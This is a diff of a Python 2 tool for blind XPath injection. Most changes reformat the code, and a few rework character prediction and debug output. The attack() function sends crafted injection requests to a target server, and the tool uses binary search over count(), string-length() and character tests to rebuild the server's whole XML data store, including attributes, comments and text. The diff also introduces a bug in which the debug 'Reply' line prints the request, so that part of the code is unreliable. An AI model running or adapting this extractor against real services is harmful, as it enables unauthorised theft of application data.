@@ -44,15 +44,18 @@ import trie
 
 # Global Variables #
 VERSION = "1.0.0_alpha"
-ROOT_NODE='/*[1]'    # Root node of a XML document
-BAD_CHAR='?'         # Character to return when we don't have a match in our character set
+ROOT_NODE = '/*[1]'  # Root node of a XML document
+BAD_CHAR = '?'       # Placeholder for a character not in character set
 NUM_FREQ_BANDS = 3
 QI = Queue.Queue()   # Input Queue
 QO = Queue.Queue()   # Output Queue
 node_names = []      # Used for optimization of previous nodes
 attribute_names = [] # Used for optimization of previous attributes
-COUNT_OPTIMIZE = 30  # Optimize the character set if flag is enabled for any string larger than this. Best when over 30ish
-root_nodes = root_comments = root_instructions = nodes_total = attributes_total = comments_total = instructions_total = text_total = elements_total = -1 # Used for optimization code
+COUNT_OPTIMIZE = 30  # Optimize the character set if flag is enabled for any
+                     # string larger than this. Best when over 30ish
+root_nodes = root_comments = root_instructions = nodes_total = \
+		attributes_total = comments_total = instructions_total = \
+		text_total = elements_total = -1 # Used for optimization code
 
 
 def print_dbg(msg):
@@ -68,7 +71,8 @@ def get_quoted_chars(chars):
 
 	if SINGLE_QUOTE in chars:
 		pt_a, pt_b = chars.split(SINGLE_QUOTE)
-		use_chars = """concat('%s',"'",'%s')""" % (encode_payload(pt_a), encode_payload(pt_b))
+		use_chars = """concat('%s',"'",'%s')""" % \
+				(encode_payload(pt_a), encode_payload(pt_b))
 	else:
 		use_chars = "'%s'" % encode_payload(chars)
 
@@ -90,7 +94,8 @@ def get_chars_by_likelihood(so_far, chars):
 
 	print_dbg('Getting prediction for "%s"' % so_far)
 	if trie_root is None:
-		return {0: chars}
+		#return {0: chars}
+		return [chars]
 
 	pred_chars = dict.fromkeys(chars, 0)
 	# User input could be a phrase
@@ -98,15 +103,17 @@ def get_chars_by_likelihood(so_far, chars):
 			strip_so_far=True, add_freqs=True, no_new=True, max_new_chars=1)
 	if ' ' in so_far:
 		# Add predictions for the last word as well
-		pred_chars = trie.predict(trie_root, so_far.split(' ')[-1], result=pred_chars,
+		pred_chars = trie.predict(trie_root,
+				re.split('(?:[^\w]|_)+', so_far)[-1], result=pred_chars,
 				strip_so_far=True, add_freqs=True, no_new=True, max_new_chars=1)
 
 	preferred = filter(lambda el: el > 0, pred_chars.values())
 	if not preferred:
 		# No candidates
-		return {0: chars}
+		#return {0: chars}
+		return [chars]
 
-	# Group charactes in bands of likelihood, those with freq = 0 in a separate band
+	# Group charactes in bands of likelihood
 	max_freq = max(pred_chars.values())
 	min_freq = min(preferred)
 	step = (max_freq - min_freq)/NUM_FREQ_BANDS + 1
@@ -115,39 +122,46 @@ def get_chars_by_likelihood(so_far, chars):
 	for char, freq in pred_chars.items():
 		freq_groups[get_band(freq)] += char
 
-	return freq_groups
+	#return freq_groups
+	return [chars for freq, chars in sorted(freq_groups.items(),
+		key=operator.itemgetter(0), reverse=True) if chars]
 
 def get_count_bst(expression, high=16, low=0):
 	'''BST Number Discovery: Start at half of high, double until too high, then
 	   check in middle of high and low, adjusting both as necessary.'''
 	cmd = encode_payload("%s=0" % expression)
 	node_test = attack(cmd)
-	if node_test: return 0 # Expression is empty
+	if node_test:
+		return 0 # Expression is empty
 
 	MAX_LENGTH = 10000
-	TO_HIGH=False
-	TO_LOW=False
+	TO_HIGH = False
+	TO_LOW = False
 	guess = (high + low)/2
-	while guess!=low and guess!=high:
+	while guess != low and guess != high:
 		if high >= MAX_LENGTH:
-			sys.stderr.write("\n#Error: Surpassed max potential %s > %i#\n" % (expression, MAX_LENGTH))
+			sys.stderr.write("\n#Error: Surpassed max potential %s > %i#\n" % \
+					(expression, MAX_LENGTH))
 			return MAX_LENGTH
 			#return 0
 		cmd = encode_payload("%s<%i" % (expression, guess))
 		node_test = attack(cmd)
 		if node_test:
-			if not TO_LOW: low /= 2
-			TO_HIGH=True
+			if not TO_LOW:
+				low /= 2
+			TO_HIGH = True
 			high = guess
 		else:
-			if not TO_HIGH: high *= 2
-			TO_LOW=True
+			if not TO_HIGH:
+				high *= 2
+			TO_LOW = True
 			low = guess
 		guess = (high + low)/2
 	return guess
 
 def encode_payload(payload):
-	''' Used to encode our characters in our BST for get_character_bst function.'''
+	'''Used to encode our characters in our BST for get_character_bst
+	   function.'''
 	global args
 	if args.urlencode: # URL Encode
 		payload = urllib.quote_plus(payload.encode('latin1'))
@@ -177,6 +191,20 @@ def encode_payload(payload):
 #			outputQueue.put((position, new_c))
 #		inputQueue.task_done()
 
+def list_intersect(ordered_list, intersect):
+	'''Fast way to remove characters from ordered_list that are not in
+	   intersect preserving the order'''
+	return ordered_list.translate(None, ordered_list.translate(None, intersect))
+
+def remove_duplicates(ordered_list):
+	'''Remove duplicates from ordered_list preserving the order'''
+	if len(set(ordered_list)) == len(ordered_list):
+		return ordered_list
+
+	seen = set()
+	return [c for c in ordered_list
+			if c not in seen and bool(seen.add(c) or True)]
+
 def to_lower(node):
 	global args
 	if args.use_lowercase:
@@ -203,10 +231,11 @@ def split_http(data):
 	return headers, body, newline
 
 def match_similar(node, node_set, definitely_matches=False):
-	'''Initially, compare our node to the set of all previously discovered nodes of its type.
-	   If we can write some XML-y intelligence, we should be able to use XML
-	   logic queries to speed this up even further. For example, we can
-	   establish sibling relationships, then child-of relationships, etc.'''
+	'''Initially, compare our node to the set of all previously discovered
+	   nodes of its type. If we can write some XML-y intelligence, we should be
+	   able to use XML logic queries to speed this up even further. For
+	   example, we can establish sibling relationships, then child-of
+	   relationships, etc.'''
 	global args
 	if not node_set:
 		return None
@@ -248,7 +277,8 @@ def match_similar(node, node_set, definitely_matches=False):
 	for i in range(max(map(lambda m: len(m), matches))):
 		charsets.append(set(map(lambda m: m[i:i+1], matches)))
 	#charsets = get_charsets_at_pos(matches)
-	print_dbg('Matching similar nodes (out of %i), charsets are:\n  %r' % (len(matches), charsets))
+	print_dbg('Matching similar nodes (out of %i), charsets are:\n  %r' % \
+			(len(matches), charsets))
 	# Get the character at (one of) the most unique position(s), i.e. one with
 	# the longest charset set
 	check_pos, charset = max(enumerate(charsets), key=lambda s: len(s[1]))
@@ -266,7 +296,8 @@ def match_similar(node, node_set, definitely_matches=False):
 	return match_similar(node, matches, definitely_matches=True)
 
 def get_character_bst(node, position, chars):
-	'''Use BST by dividing across a character set until we find our matched character.'''
+	'''Use BST by dividing across a character set until we find our matched
+	   character.'''
 	global args
 
 	remove = "\x0b\x0c" # XPath doesn't support these 'printable' characters
@@ -312,34 +343,45 @@ def get_character_bst(node, position, chars):
 	return chars # will be '' if position is beyond string-len(value)
 
 def get_character_smart(node, position, char_freq_groups):
-	'''Group characters in frequency bands and use BST on each band'''
+	'''Group characters in frequency bands and use BST on each band.
+	   char_freq_groups is a list of strings (character sets) in order or
+	   likelihood.'''
 	
-	for band, chars in sorted(char_freq_groups.items(), key=operator.itemgetter(0), reverse=True):
-		if not chars:
-			continue
+	#  for band, chars in sorted(char_freq_groups.items(),
+	#          key=operator.itemgetter(0), reverse=True):
+	#	if not chars:
+	#		continue
+	band = len(char_freq_groups)
+	for chars in char_freq_groups:
 		print_dbg('Frequency band %i: trying character group "%r"' % (band, chars))
 		new_c = get_character_bst(node, position, chars)
 		if new_c is not None:
 			break
+		band -= 1
 
 	if new_c is None:
-		sys.stderr.write("\n#Error: %s at postion %i is not in provided character set#\n" % (node, position))
+		sys.stderr.write("\n#Error: " + \
+				"%s at postion %i is not in provided character set#\n" % \
+				(node, position))
 		sys.stdout.flush()
 		new_c = BAD_CHAR
 	return new_c
 
 def get_value_bst(node, count):
-	'''Tie BST String-Length with BST Character Discovery and perform exception handling.'''
+	'''Tie BST String-Length with BST Character Discovery and perform exception
+	   handling.'''
 	global args
 	sys.stdout.flush()
 	chars = args.character_set
 
-	# TODO: Attempt pre-discovery stuff here, which somewhat implies we know what type 'node' is
+	#TODO: Attempt pre-discovery stuff here, which somewhat implies we know
+	#      what type 'node' is
 	if args.normalize_space:
 		node = 'normalize-space(%s)' % node
 
 	if args.prediscover_strlen:
-		strlen = get_count_bst("string-length(%s)" % node, args.len_high, args.len_low)
+		strlen = get_count_bst("string-length(%s)" % node, args.len_high,
+				args.len_low)
 		if count is None:
 			count = strlen
 		else:
@@ -360,7 +402,8 @@ def get_value_bst(node, count):
 	if True:
 		pos = 1
 		while True and (count is None or pos <= count):
-			new_c = get_character_smart(node, pos, get_chars_by_likelihood(value, chars))
+			new_c = get_character_smart(node, pos,
+					get_chars_by_likelihood(value, chars))
 			if new_c == '':
 				assert not args.prediscover_strlen
 				break
@@ -402,7 +445,8 @@ def get_xml_details():
 	global args
 
 	xml_content = ''
-	# Slight optimization here if the document is top heavy or doesn't contain certain node types
+	# Slight optimization here if the document is top heavy or doesn't contain
+	# certain node types
 	root_nodes = get_count_bst("count(/*)")
 	root_comments = get_count_bst("count(/comment())")
 	root_instructions = get_count_bst("count(/processing-instruction())")
@@ -414,21 +458,28 @@ def get_xml_details():
 		instructions_total = get_count_bst("count(//processing-instruction())")
 		text_total = get_count_bst("count(//text())")
 		elements_total = nodes_total + attributes_total + comments_total + text_total
-		print "### XML Details: Root Nodes: %i, Root Comments: %i, Root Instructions: %i, Total Nodes: %i, Attributes: %i, Comments: %i, Instructions: %i, Text: %i, Total: %i ###" % (root_nodes, root_comments, root_instructions, nodes_total, attributes_total, comments_total, instructions_total, text_total, elements_total)
+		print ("### XML Details: Root Nodes: %i, Root Comments: %i, " + \
+				"Root Instructions: %i, Total Nodes: %i, Attributes: %i, " + \
+				"Comments: %i, Instructions: %i, Text: %i, Total: %i ###") % \
+				(root_nodes, root_comments, root_instructions, nodes_total,
+						attributes_total, comments_total, instructions_total,
+						text_total, elements_total)
 
-	if args.no_root: return xml_content
+	if args.no_root:
+		return xml_content
 
 	if not args.no_comments:
 		for c in range(1, root_comments+1):
-			comments_total-=1
+			comments_total -= 1
 			comment = get_value_bst("/comment()[%s]" % (c), args.max_cont_len)
 			xml_content += ("<!--%s-->" % comment)
 			sys.stdout.write("<!--%s-->" % comment)
 
 	if not args.no_processor:
 		for i in range(1, root_instructions+1):
-			instructions_total-=1
-			instruction = get_value_bst("/processing-instruction()[%s]" % (i), args.max_cont_len)
+			instructions_total -= 1
+			instruction = get_value_bst("/processing-instruction()[%s]" % (i),
+					args.max_cont_len)
 			xml_content += ("<?%s?>" % instruction)
 			sys.stdout.write("<?%s?>" % instruction)
 
@@ -447,7 +498,8 @@ def get_xml_bst(node, level=0):
 	global instructions_total
 	global text_total
 	xml_content = ''
-	if nodes_total == 0: return ''
+	if nodes_total == 0:
+		return ''
 
 	if level >= len(node_names):
 		node_names.append(set([]))
@@ -466,21 +518,26 @@ def get_xml_bst(node, level=0):
 	child_count = attribute_count = comment_count = instruction_count = text_count = 0
 
 	if not args.no_attributes:
-		if attributes_total!=0: attribute_count = get_count_bst("count(%s/@*)" % node)
+		if attributes_total != 0:
+			attribute_count = get_count_bst("count(%s/@*)" % node)
 		for a in range(1, attribute_count+1):
-			attributes_total-=1
+			attributes_total -= 1
 
 			attribute_name = None
 			if args.xml_match:
-				attribute_name = match_similar("name(%s/@*[%i])" % (node, a), attribute_names[level])
+				attribute_name = match_similar("name(%s/@*[%i])" % (node, a),
+						attribute_names[level])
 			if not attribute_name:
-				attribute_name = get_value_bst("name(%s/@*[%i])" % (node, a), args.max_name_len)
+				attribute_name = get_value_bst("name(%s/@*[%i])" % (node, a),
+						args.max_name_len)
 				attribute_names[level].add(attribute_name)
 
 			if not args.no_values:
-				attribute_value = get_value_bst("%s/@*[%i]" % (node, a), args.max_cont_len)
+				attribute_value = get_value_bst("%s/@*[%i]" % (node, a),
+						args.max_cont_len)
 				xml_content += (' %s="%s"' % (attribute_name, attribute_value))
-				sys.stdout.write(' %s="%s"' % (attribute_name.encode('latin1'), attribute_value.encode('latin1')))
+				sys.stdout.write(' %s="%s"' % (attribute_name.encode('latin1'),
+					attribute_value.encode('latin1')))
 			else:
 				xml_content += (' %s' % (attribute_name))
 				sys.stdout.write(' %s' % (attribute_name.encode('latin1')))
@@ -489,43 +546,51 @@ def get_xml_bst(node, level=0):
 
 
 	if not args.no_comments:
-		if comments_total!=0: comment_count = get_count_bst("count(%s/comment())" % node)
+		if comments_total != 0:
+			comment_count = get_count_bst("count(%s/comment())" % node)
 		for c in range(1, comment_count+1):
-			comments_total-=1
+			comments_total -= 1
 			comment = get_value_bst("%s/comment()[%s]" % (node, c), args.max_cont_len)
 			xml_content += ("<!--%s-->" % comment)
 			sys.stdout.write("<!--%s-->" % comment.encode('latin1'))
 
 	if not args.no_processor:
-		if instructions_total!=0: instruction_count = get_count_bst("count(%s/processing-instruction())" % node)
+		if instructions_total != 0:
+			instruction_count = \
+					get_count_bst("count(%s/processing-instruction())" % node)
 		for i in range(1, instruction_count+1):
-			nodes_total-=1
-			instructions_total-=1
-			instruction = get_value_bst("%s/processing-instruction()[%s]" % (node, i), args.max_cont_len)
+			nodes_total -= 1
+			instructions_total -= 1
+			instruction = get_value_bst("%s/processing-instruction()[%s]" \
+					% (node, i), args.max_cont_len)
 			xml_content += ("<?%s?>" % instruction)
 			sys.stdout.write("<?%s?>" % instruction.encode('latin1'))
 
 	if not args.no_child:
-		if nodes_total!=0: child_count = get_count_bst("count(%s/*)" % node)
+		if nodes_total != 0:
+			child_count = get_count_bst("count(%s/*)" % node)
 		for c in range(1, child_count+1):
 			xml_content += get_xml_bst("%s/*[%s]" % (node, c), level+1)
-			nodes_total-=1
+			nodes_total -= 1
 
 	if not args.no_text:
-		if text_total!=0: text_count = get_count_bst("count(%s/text())" % node)
+		if text_total != 0:
+			text_count = get_count_bst("count(%s/text())" % node)
 		for t in range(1, text_count+1):
-			text_total-=1
-			text_value = get_value_bst("%s/text()[%i]" % (node, t), args.max_cont_len)
+			text_total -= 1
+			text_value = get_value_bst("%s/text()[%i]" % (node, t),
+					args.max_cont_len)
 			if re.search('\S', text_value, re.MULTILINE):
 				xml_content += ("%s" % text_value)
-				sys.stdout.write("%s" % text_value.replace('\n', '').encode('latin1'))
+				sys.stdout.write("%s" % \
+						text_value.replace('\n', '').encode('latin1'))
 
 	xml_content += ("</%s>" % (node_name))
 	sys.stdout.write("</%s>" % (node_name))
 	return xml_content
 
 def xml_search(string_literal):
-	''' Enumerate over each type of node searching for a particular string.	'''
+	'''Enumerate over each type of node searching for a particular string.'''
 	global args
 
 	# Needs to be quoted with single/double quotes
@@ -544,23 +609,31 @@ def xml_search(string_literal):
 		args.use_lowercase = False
 
 	if not args.no_child: # Use the no_child parameter for node names
-		node_count = get_count_bst('count(//*[%s(%s,%s)])' % (match, name_node, string_literal))
-		print "### Found %s in %i node name(s) ###" % (string_literal, node_count)
+		node_count = get_count_bst('count(//*[%s(%s,%s)])' % \
+				(match, name_node, string_literal))
+		print "### Found %s in %i node name(s) ###" % \
+				(string_literal, node_count)
 		for n in range(1, node_count+1):
-			node_name = get_value_bst('(name((//*[%s(%s,%s)])[%i]))' % (match, name_node, string_literal, n), args.max_name_len)
+			node_name = get_value_bst('(name((//*[%s(%s,%s)])[%i]))' % \
+					(match, name_node, string_literal, n), args.max_name_len)
 			print node_name
 
 	if not args.no_attributes:
-		attribute_count = get_count_bst("count(//@*[%s(%s,%s)])" % (match, name_node, string_literal))
-		print "### Found %s in %i attribute name(s) ###" % (string_literal, attribute_count)
+		attribute_count = get_count_bst("count(//@*[%s(%s,%s)])" % \
+				(match, name_node, string_literal))
+		print "### Found %s in %i attribute name(s) ###" % \
+				(string_literal, attribute_count)
 		for a in range(1, attribute_count+1):
-			attribute_name = get_value_bst('(name((//@*[%s(%s,%s)])[%i]))' % (match, name_node, string_literal, a), args.max_name_len)
-			attribute_value = get_value_bst('(//@*[%s(%s,%s)])[%i]' % (match, name_node, string_literal, a), args.max_cont_len)
+			attribute_name = get_value_bst('(name((//@*[%s(%s,%s)])[%i]))' % \
+					(match, name_node, string_literal, a), args.max_name_len)
+			attribute_value = get_value_bst('(//@*[%s(%s,%s)])[%i]' % \
+					(match, name_node, string_literal, a), args.max_cont_len)
 			print '%s="%s"' % (attribute_name, attribute_value)
 
-			''' # Assume they always want the value if they are searching for the name
+			'''# Assume they always want the value if they are searching for the name
 			if not args.no_values:
-				attribute_value = get_value_bst('(//@*[%s(%s,%s)])[%i]' % (match,name_node,string_literal,a), args.max_cont_len)
+				attribute_value = get_value_bst('(//@*[%s(%s,%s)])[%i]' % \
+						(match,name_node,string_literal,a), args.max_cont_len)
 				print '%s="%s"' % (attribute_name, attribute_value)
 			else:
 				print '%s' % (attribute_name)
@@ -569,36 +642,46 @@ def xml_search(string_literal):
 
 	# Moved this block out of the no_attributes above in order to have distinct searches
 	if not args.no_values:
-		attribute_count = get_count_bst("count(//@*[%s(%s,%s)])" % (match, node, string_literal))
-		print "### Found %s in %i attribute value(s) ###" % (string_literal, attribute_count)
+		attribute_count = get_count_bst("count(//@*[%s(%s,%s)])" % \
+				(match, node, string_literal))
+		print "### Found %s in %i attribute value(s) ###" % \
+				(string_literal, attribute_count)
 		for a in range(1, attribute_count+1):
-			attribute_name = get_value_bst('(name((//@*[%s(%s,%s)])[%i]))' % (match, node, string_literal, a), args.max_name_len)
+			attribute_name = get_value_bst('(name((//@*[%s(%s,%s)])[%i]))' % \
+					(match, node, string_literal, a), args.max_name_len)
 
 			if not args.no_values:
-				attribute_value = get_value_bst('((//@*[%s(%s,%s)])[%i])' % (match, node, string_literal, a), args.max_cont_len)
+				attribute_value = get_value_bst('((//@*[%s(%s,%s)])[%i])' % \
+						(match, node, string_literal, a), args.max_cont_len)
 				print '%s="%s"' % (attribute_name, attribute_value)
 			else:
 				print '%s' % (attribute_name)
 
 	if not args.no_comments:
-		comment_count = get_count_bst("count(//comment()[%s(%s,%s)])" % (match, node, string_literal))
+		comment_count = get_count_bst("count(//comment()[%s(%s,%s)])" % \
+				(match, node, string_literal))
 		print "### Found %s in %i comments(s) ###" % (string_literal, comment_count)
 		for c in range(1, comment_count+1):
-			comment = get_value_bst("(//comment()[%s(%s,%s)])[%i]" % (match, node, string_literal, c), args.max_cont_len)
+			comment = get_value_bst("(//comment()[%s(%s,%s)])[%i]" % \
+					(match, node, string_literal, c), args.max_cont_len)
 			print "<!--%s-->" % comment
 
 	if not args.no_processor:
-		instruction_count = get_count_bst("count(//processing-instruction()[%s(%s,%s)])" % (match, node, string_literal))
+		instruction_count = get_count_bst("count(//processing-instruction()[%s(%s,%s)])" % \
+				(match, node, string_literal))
 		print "### Found %s in %i instruction(s) ###" % (string_literal, instruction_count)
 		for i in range(1, instruction_count+1):
-			instruction = get_value_bst("(//processing-instruction()[%s(%s,%s)])[%i]" % (match, node, string_literal, i), args.max_cont_len)
+			instruction = get_value_bst("(//processing-instruction()[%s(%s,%s)])[%i]" % \
+					(match, node, string_literal, i), args.max_cont_len)
 			print "<?%s?>" % instruction
 
 	if not args.no_text:
-		text_count = get_count_bst("count(//text()[%s(%s,%s)])" % (match, node, string_literal))
+		text_count = get_count_bst("count(//text()[%s(%s,%s)])" % \
+				(match, node, string_literal))
 		print "### Found %s in %i text(s) ###" % (string_literal, text_count)
 		for t in range(1, text_count+1):
-			text = get_value_bst("(//text()[%s(%s,%s)])[%i]" % (match, node, string_literal, t), args.max_cont_len)
+			text = get_value_bst("(//text()[%s(%s,%s)])[%i]" % \
+					(match, node, string_literal, t), args.max_cont_len)
 			print "%s" % text
 
 
@@ -614,7 +697,8 @@ def xml_optimize_character_set_node(node, chars):
 	return present
 
 def xml_optimize_character_set(chars):
-	''' Optimize a character set by searching globally for each character in the database '''
+	'''Optimize a character set by searching globally for each character in the
+	   database'''
 	global args
 
 	remove = "\x0b\x0c" # XPath doesn't support these 'printable' characters
@@ -629,12 +713,13 @@ def xml_optimize_character_set(chars):
 		if attack(encode_payload(cmd)):
 			present += c
 
-	sys.stdout.write("### Match set optimized from %i to %i characters: %s ###\n" % (len(chars), len(present), repr(present)))
+	sys.stdout.write("### Match set optimized from %i to %i characters: %s ###\n" % \
+			(len(chars), len(present), repr(present)))
 	return present
 
 
 def attack(inject):
-	''' Parses injection request, passes to socket, and attempts to match response.'''
+	'''Parses injection request, passes to socket, and attempts to match response.'''
 	global args
 	global REQUEST_COUNT
 
@@ -651,14 +736,18 @@ def attack(inject):
 
 		# Automatically Update Host header if present and given on cmdline
 		if not is_ip:
-			headers = re.sub(r'^Host:.*', 'Host: %s' % args.host, headers, re.IGNORECASE | re.MULTILINE)
+			headers = re.sub(r'^Host:.*', 'Host: %s' % args.host,
+					headers, re.IGNORECASE | re.MULTILINE)
 		# Automatically update Content-Length
-		request = re.sub(r'^Content-Length:.*', 'Content-Length: %i' % len(body), request, re.IGNORECASE | re.MULTILINE)
+		request = re.sub(r'^Content-Length:.*', 'Content-Length: %i' % len(body),
+				request, re.IGNORECASE | re.MULTILINE)
 		# Change Accept-Encoding header value to none if present - DC 4/14/14
-		headers = re.sub(r'^Accept-Encoding:.*', 'Accept-Encoding: none', headers, re.IGNORECASE | re.MULTILINE)
+		headers = re.sub(r'^Accept-Encoding:.*', 'Accept-Encoding: none',
+				headers, re.IGNORECASE | re.MULTILINE)
 		# Change Connection header value to close if present - DC 4/24/14
 		if re.search(r'^Connection:', headers, re.IGNORECASE | re.MULTILINE):
-			headers = re.sub(r'^Connection:.*', 'Connection: close', headers, re.IGNORECASE | re.MULTILINE)
+			headers = re.sub(r'^Connection:.*', 'Connection: close',
+					headers, re.IGNORECASE | re.MULTILINE)
 		else:
 			# Add Connection: close if no Connection header is present
 			headers += newline + 'Connection: close'
@@ -670,7 +759,8 @@ def attack(inject):
 	while not s:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			if args.use_ssl: s = ssl.wrap_socket(s)
+			if args.use_ssl:
+				s = ssl.wrap_socket(s)
 			s.connect((args.host, args.port))
 			#s.setblocking(0)
 			s.send(request)
@@ -683,14 +773,16 @@ def attack(inject):
 			MAX -= 1
 			s = None
 			time.sleep(1)
-	REQUEST_COUNT+=1 # Bump our global request count
+	REQUEST_COUNT += 1 # Bump our global request count
 
 	total = ''
-	# TODO: we need a max time to read data, and a timeout for nonblocking
-	# TODO: Use keep-alive to speed up this code, which will however require a rearchitecture and some processing for HTTP POST data size reading
+	#TODO: we need a max time to read data, and a timeout for nonblocking
+	#TODO: Use keep-alive to speed up this code, which will however require
+	#      a rearchitecture and some processing for HTTP POST data size reading
 	while True:
 		data = s.recv(65534)
-		if not data: break
+		if not data:
+			break
 		total += data
 	data = total
 	s.close()
@@ -702,7 +794,8 @@ def attack(inject):
 
 	if args.match_type == 'length':
 		# Search content length in headers (won't match unless HTTP)
-		cont_len = re.search(r'^Content-Length:\s*([0-9]+)\s*$', headers, re.IGNORECASE | re.MULTILINE)
+		cont_len = re.search(r'^Content-Length:\s*([0-9]+)\s*$',
+				headers, re.IGNORECASE | re.MULTILINE)
 		try:
 			cont_len = cont_len.groups()[0]
 		except AttributeError as e:
@@ -719,9 +812,13 @@ def attack(inject):
 			match_data = body
 		else:
 			match_data = data
-		found = bool(re.search(args.match, match_data, args.match_case)) and not args.match_fail
+		found = bool(re.search(args.match, match_data,
+			args.match_case)) and not args.match_fail
 
-	if args.example: print "### Request: ###\n%s\n### Reply: ###\n%s\n### Match: '%s' = %s ###\n" % (request, data, args.match, found)
+	if args.example:
+		print "### Request: ###\n%s" % request
+		print "### Reply: ###\n%s" % request
+		print "### Match: '%s' = %s ###" % (args.match, found)
 	return found
 
 
@@ -858,12 +955,13 @@ if __name__ == "__main__":
 			exit(3)
 	if args.unicode:
 		# Some editors will complain about the Unicode string below.. use a better editor
-		unicode_str = ''.join(set(u"ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ"))
+		unicode_str = u"ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ"
 		sys.stdout.write("### Adding %i Unicode characters to character set of length %i ###\n" % (len(unicode_str), len(args.character_set)))
 		args.character_set += unicode_str
 	if args.optimize_charset:
 		args.character_set = xml_optimize_character_set(args.character_set)
-	args.character_set = ''.join(set(args.character_set)) # Eliminate duplicates in our set
+	# Eliminate duplicates in our set
+	args.character_set = ''.join(set((args.character_set)))
 
 	# Build trie for predictive text
 	trie_root = None
@@ -910,7 +1008,8 @@ if __name__ == "__main__":
 		exit(0)
 
 	# Start our XML Content with an empty string
-	if not args.summary: print "\n### Raw XML ####:"
+	if not args.summary:
+		print "\n### Raw XML ####:"
 	xml_content = ''
 	xml_content += get_xml_details()
 
